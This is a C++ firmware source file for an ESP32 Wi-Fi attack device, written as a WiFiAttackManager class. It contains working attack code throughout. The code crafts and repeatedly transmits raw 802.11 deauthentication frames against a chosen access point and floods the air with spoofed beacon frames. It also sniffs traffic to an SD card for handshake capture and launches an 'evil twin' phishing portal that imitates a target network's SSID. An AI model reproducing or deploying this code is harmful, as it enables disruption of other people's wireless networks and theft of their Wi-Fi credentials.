#include "WiFiManager.h" 
#include "SdManager.h"
#include "WebPortalManager.h" 
#include "Config.h"
#include <esp_wifi.h>

static WiFiAttackManager* g_wifiManager = nullptr;

WiFiAttackManager::WiFiAttackManager() : 
    _state(WiFiState::IDLE), 
    _lastPacketTime(0), 
    _packetsSent(0), 
    _capturedHandshake(false),
    _scanRetries(0)
{
    g_wifiManager = this; 
    memset(_packetBuffer, 0, 128);
}

void WiFiAttackManager::setup() { 
    WiFi.mode(WIFI_STA); 
    WiFi.disconnect(); 
    esp_wifi_set_ps(WIFI_PS_NONE); 
}

void WiFiAttackManager::stop() {
    SdManager::getInstance().stopCapture();
    
    if (WebPortalManager::getInstance().isRunning()) {
        WebPortalManager::getInstance().stop();
    }
    
    _state = WiFiState::IDLE;
    _scanRetries = 0;
    
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    esp_wifi_set_promiscuous(false);
    WiFi.softAPdisconnect(true);
    WiFi.mode(WIFI_STA);
    
    // FIX #4: Anti-Zombie AP Delay
    // Ждем пока LwIP и радио освободят ресурсы
    vTaskDelay(pdMS_TO_TICKS(150)); 
}

void WiFiAttackManager::startScan() {
    if (_state != WiFiState::IDLE) return;
    _scanRetries = 0;
    WiFi.scanNetworks(true); 
    _state = WiFiState::SCANNING;
}

void WiFiAttackManager::startDeauth(const TargetAP& target) {
    _currentTarget = target; 
    _packetsSent = 0; 
    _capturedHandshake = false;
    SdManager::getInstance().startCapture();
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_channel(_currentTarget.channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous_rx_cb(&WiFiAttackManager::snifferHandler);
    buildDeauthPacket();
    _state = WiFiState::ATTACKING_DEAUTH;
}

void WiFiAttackManager::startBeaconSpam() { 
    _packetsSent = 0; 
    esp_wifi_set_promiscuous(true); 
    _state = WiFiState::ATTACKING_BEACON; 
}

void WiFiAttackManager::startEvilTwin(const TargetAP& target) {
    _currentTarget = target; 
    _state = WiFiState::ATTACKING_EVIL_TWIN;
    esp_wifi_set_promiscuous(false);
    WebPortalManager::getInstance().start(target.ssid);
}

void WiFiAttackManager::buildDeauthPacket() {
    memset(_packetBuffer, 0, 26);
    _packetBuffer[0] = 0xC0; _packetBuffer[1] = 0x00; 
    _packetBuffer[2] = 0x3A; _packetBuffer[3] = 0x01; 
    memset(&_packetBuffer[4], 0xFF, 6);               
    memcpy(&_packetBuffer[10], _currentTarget.bssid, 6); 
    memcpy(&_packetBuffer[16], _currentTarget.bssid, 6); 
    _packetBuffer[24] = 0x00; _packetBuffer[25] = 0x00; 
}

void WiFiAttackManager::buildBeaconPacket(const char* ssid) {
    int len = strlen(ssid); if (len > 32) len = 32;
    memset(_packetBuffer, 0, 128);
    _packetBuffer[0] = 0x80; _packetBuffer[1] = 0x00; 
    memset(&_packetBuffer[4], 0xFF, 6);               
    for(int i=10;i<16;i++) _packetBuffer[i] = random(0,255);
    memcpy(&_packetBuffer[16], &_packetBuffer[10], 6); 
    _packetBuffer[32] = 0x64; _packetBuffer[33] = 0x00; 
    _packetBuffer[34] = 0x01; _packetBuffer[35] = 0x00;
    _packetBuffer[36] = 0x00; _packetBuffer[37] = len;
    memcpy(&_packetBuffer[38], ssid, len);
    int offset = 38 + len;
    _packetBuffer[offset++] = 0x01; _packetBuffer[offset++] = 0x08; 
    _packetBuffer[offset++] = 0x82; _packetBuffer[offset++] = 0x84; 
    _packetBuffer[offset++] = 0x03; _packetBuffer[offset++] = 0x01; 
    _packetBuffer[offset++] = random(1, 12); 
}

void IRAM_ATTR WiFiAttackManager::snifferHandler(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t* pkt = (wifi_promiscuous_pkt_t*)buf;
    if (pkt->rx_ctrl.sig_len < 10 || pkt->rx_ctrl.sig_len > Config::MAX_PACKET_LEN) return;
    SdManager::getInstance().enqueuePacketFromISR(pkt->payload, pkt->rx_ctrl.sig_len);
}

bool WiFiAttackManager::loop(StatusMessage& statusOut) {
    uint32_t now = millis();
    statusOut.handshakeCaptured = _capturedHandshake;

    if (_state == WiFiState::ATTACKING_EVIL_TWIN) {
        WebPortalManager::getInstance().processDns();
        statusOut.state = SystemState::ATTACKING_EVIL_TWIN;
        snprintf(statusOut.logMsg, MAX_LOG_MSG, "Phishing: %s", _currentTarget.ssid);
        vTaskDelay(pdMS_TO_TICKS(5)); 
        return true; 
    }

    if (_state == WiFiState::SCANNING) {
        statusOut.state = SystemState::SCANNING;
        int n = WiFi.scanComplete();
        if (n >= 0) { 
            _state = WiFiState::SCAN_COMPLETE; 
            snprintf(statusOut.logMsg, MAX_LOG_MSG, "Found: %d", n); 
        }
        else if (n == -2) {
            _scanRetries++;
            if (_scanRetries > 3) {
                _state = WiFiState::IDLE; 
                snprintf(statusOut.logMsg, MAX_LOG_MSG, "Scan Failed!");
                return false; 
            } else {
                WiFi.scanNetworks(true); 
                snprintf(statusOut.logMsg, MAX_LOG_MSG, "Retry %d...", _scanRetries);
            }
        }
        else {
            snprintf(statusOut.logMsg, MAX_LOG_MSG, "Scanning...");
        }
        return true;
    }
    
    if (_state == WiFiState::SCAN_COMPLETE) { 
        statusOut.state = SystemState::SCAN_COMPLETE; 
        return false; 
    }

    if (_state == WiFiState::ATTACKING_DEAUTH) {
        statusOut.state = SystemState::ATTACKING_WIFI_DEAUTH; 
        if (now - _lastPacketTime > 10) {
            for(int i=0; i<3; i++) { 
                esp_wifi_80211_tx(WIFI_IF_STA, _packetBuffer, 26, false); 
                _packetsSent++; 
            }
            _lastPacketTime = now;
        }
        statusOut.packetsSent = _packetsSent;
        snprintf(statusOut.logMsg, MAX_LOG_MSG, "Deauthing...");
        return true;
    }

    if (_state == WiFiState::ATTACKING_BEACON) {
        statusOut.state = SystemState::ATTACKING_WIFI_SPAM; 
        if (now - _lastPacketTime > 50) {
            const char* ssid = _spamSSIDs[random(0, _spamSSIDs.size())];
            buildBeaconPacket(ssid);
            int pktLen = 51 + strlen(ssid); 
            esp_wifi_80211_tx(WIFI_IF_STA, _packetBuffer, pktLen, false); 
            _packetsSent++;
            _lastPacketTime = now;
        }
        snprintf(statusOut.logMsg, MAX_LOG_MSG, "Beacon Spam");
        return true;
    }

    return false;
}

std::vector<TargetAP> WiFiAttackManager::getScanResults() {
    std::vector<TargetAP> results;
    int n = WiFi.scanComplete();
    if (n > 0) {
        for (int i = 0; i < min(n, 30); ++i) {
            TargetAP ap;
            strncpy(ap.ssid, WiFi.SSID(i).c_str(), 32); ap.ssid[32] = 0; 
            memcpy(ap.bssid, WiFi.BSSID(i), 6);
            ap.channel = WiFi.channel(i); 
            ap.rssi = WiFi.RSSI(i);
            results.push_back(ap);
        }
    }
    return results;
}